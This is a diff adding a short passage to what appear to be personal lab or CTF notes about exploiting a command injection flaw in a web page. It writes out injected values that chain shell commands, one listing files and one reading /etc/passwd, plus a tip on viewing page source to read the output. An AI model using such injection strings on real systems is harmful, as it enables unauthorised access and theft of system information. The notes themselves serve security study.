@@ -2235,3 +2235,20 @@ let's try to:
 =>
 we found a way to command injection:
 =>
+let's try to see the content:
+`; ls -lah; asd`
+>[!tips]
+>if you have a bad formatted output
+>=>
+>press CTRL+U in the page to see -->  the source code
+>=>
+>to see also better -->  the output
+
+=>
+for example with the last command:
+![[Pasted image 20240308121336.png]]
+
+<span style="background:#fff88f">list user:</span>
+`; cat /etc/passwd; asd`
+![[Pasted image 20240308121532.png]]
+
